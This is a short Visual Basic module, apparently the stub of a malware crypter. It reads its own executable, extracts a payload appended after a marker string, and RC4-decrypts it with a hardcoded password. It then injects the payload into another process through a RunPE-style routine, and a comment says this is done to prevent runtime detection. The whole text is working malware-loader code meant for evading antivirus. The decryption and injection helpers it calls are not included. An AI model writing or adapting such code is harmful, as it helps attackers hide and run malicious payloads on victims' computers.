Attribute VB_Name = "mainmod"
Const myEncPass = "thepassword"
Sub Main()
    Dim thisfile As String, infectedfile As String, selfpath As String
    
    'The path to itself
    selfpath = App.Path & "\" & App.EXEName & ".exe"
    
    'open itself and get all the data in one variable
    Open selfpath For Binary As #1
    thisfile = Space(LOF(1))
    Get #1, , thisfile
    Close #1
    
    'Take the part of the file after XSEPERATORX and decrypt it
    infectedfile = Split(thisfile, "XSEPERATORX")(1)
    infectedfile = RC4(infectedfile, myEncPass)
    
    'Use RUNPE to inject the file into another process. This prevents runtime detection
    Injec selfpath, StrConv(infectedfile, vbFromUnicode), vbNullString
End Sub
